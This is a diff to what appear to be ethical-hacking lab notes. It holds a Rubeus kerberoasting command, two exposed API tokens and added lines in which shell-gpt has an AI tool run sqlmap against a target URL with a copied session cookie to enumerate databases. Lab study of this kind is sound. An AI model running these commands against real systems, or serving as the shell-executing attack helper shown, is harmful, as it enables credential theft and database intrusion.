@@ -46,4 +46,8 @@ Rubeus.exe kerberoas /outfile:hash.txt
 
 AI 22c83d6b6e5a4863b6998a625906c671
 WPSCAn API token hWt9qrMZFm7MKprTWcjdasowoQZ7yMccyPg8lsb8ads
+bash sgt.sh
+type the activation key
+sgpt --chat sql --shell "Use sqlmap on target url http://www.moviescope.com/viewprofile.aspx?id=1 with cookie value '[cookie value which you have copied in Step#3]' and enumerate the DBMS databases" 
+
 
